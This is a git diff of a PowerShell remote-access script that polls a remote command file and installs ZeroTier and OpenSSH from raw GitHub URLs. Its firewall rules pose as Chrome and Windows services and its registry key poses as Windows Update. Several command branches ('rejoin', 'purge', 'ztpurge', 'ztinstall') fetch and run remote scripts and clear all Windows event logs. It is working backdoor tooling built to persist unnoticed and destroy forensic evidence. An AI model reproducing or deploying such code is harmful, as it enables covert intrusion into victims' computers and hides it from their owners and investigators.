@@ -9,6 +9,8 @@ $ztfirewall = "ZeroTier One"
 $ztfirewall2 = "ZeroTier x64 Binary In"
 $ztfirewall3 = "ZeroTier UDP/9993 In"
 $ssholdfirewall = "Google Chrome Core Service"
+$ztprogramname = "ZeroTier One"
+$sshprogramname = "OpenSSH"
 $sshfirewall = "Windows Runtime Broker"
 $ztdir = "C:\ProgramData\ZeroTier"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
@@ -16,7 +18,7 @@ $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1"
+$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
 $ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
 $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
 $programDataPath = $env:ProgramData
@@ -219,12 +221,19 @@ function Delete-Directories {
         }
     }
 }
-#Function to Purge Zerotier
-function zerotier_purge {
-Install-PackageProvider -Name NuGet -Force | Out-Null
-Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
+#Function to Uninstall a program.
+function Uninstall-Program {
+    param (
+        [string]$ProgramName
+    )
+    if (Get-Package -Name $ProgramName -ErrorAction SilentlyContinue) {
+        Uninstall-Package -Name $ProgramName -Force
+        Write-Output "$ProgramName has been uninstalled."
+    } else {
+        Write-Output "$ProgramName is not installed."
+    }
 }
-#Code starts here.
+###Code starts here.
 # Check if the "Code" value is not null (i.e., it exists)
 CheckAndUpdateRegistryCode
 if ($storedCode -ne $null) {
@@ -270,23 +279,8 @@ if ($storedCode -ne $null) {
                 	}
                     "rejoin" {
               			Retry-Operation {
-		 				zerotier_purge
-                      				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
-                      				Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
-                      				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
-                      				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
-                      				Delete-ServiceSafe -ServiceName $ztservice
-                      				Delete-ServiceSafe -ServiceName $ztservice2
-                      				Delete-ServiceSafe -ServiceName $sshagentservice
-                      				Delete-ServiceSafe -ServiceName $sshdservice							
-                      				Disable-FirewallRules -ruleName $ztfirewall
-                      				Disable-FirewallRules -ruleName $sshfirewall
-                      				Remove-FirewallRuleSafe -RuleName $ztfirewall
-                      				Remove-FirewallRuleSafe -RuleName $sshfirewall							
-                      				Delete-Directories -directories $ztdir
-                      				Delete-Directories -directories $sshdir
-                      				Delete-Directories -directories $sshdatadir
-                      				Delete-Directories -directories $ztdatadir
+		 				Uninstall-Program -ProgramName $ztprogramname
+						Uninstall-Program -ProgramName $sshprogramname
                       				web-install -InstallScriptURL $sshinstall
                       				web-install -InstallScriptURL $ztinstall
                       				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
@@ -294,7 +288,8 @@ if ($storedCode -ne $null) {
 			}
                     "purge" {
 	                        Retry-Operation {
-			 			zerotier_purge
+			 			Uninstall-Program -ProgramName $ztprogramname
+						Uninstall-Program -ProgramName $sshprogramname
                       				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                       				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                       				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
@@ -320,33 +315,17 @@ if ($storedCode -ne $null) {
 			                } -MaxRetries $retryAttempts
 				}
               		#Zerotier Purged, OpenSSH Disbaled
-              		"zpod" {
+              		"ztpurge" {
 					Retry-Operation {
-     						zerotier_purge
-                				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
-                				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
-                				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
-                       				Delete-ServiceSafe -ServiceName $ztservice										
-                        			Disable-FirewallRules -ruleName $ztfirewall
-                				Disable-FirewallRules -ruleName $ztfirewall2
-                				Disable-FirewallRules -ruleName $ztfirewall3
-                				Disable-FirewallRules -ruleName $sshfirewall
-                				Disable-FirewallRules -ruleName $ssholdfirewall
-                				Remove-FirewallRuleSafe -RuleName $ztfirewall
-                				Remove-FirewallRuleSafe -ruleName $ztfirewall2
-                        			Remove-FirewallRuleSafe -ruleName $ztfirewall3
-                        			Delete-Directories -directories $ztdir
+     						Uninstall-Program -ProgramName $ztprogramname
                         			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
               				} -MaxRetries $retryAttempts
 				}
               		#Zerotier Install, OpenSSH Enabled
-              		"zioe" {
+              		"ztinstall" {
                          		Retry-Operation {				
-                        			Start-ServiceSafe -ServiceName $sshagentservice
-                        			Start-ServiceSafe -ServiceName $sshdservice
-                				Enable-FirewallRule -ruleName $sshfirewall
                         			web-install -InstallScriptURL $ztinstall
-                        			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+			  			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
                   			} -MaxRetries $retryAttempts
               	  		}                
               	  	}
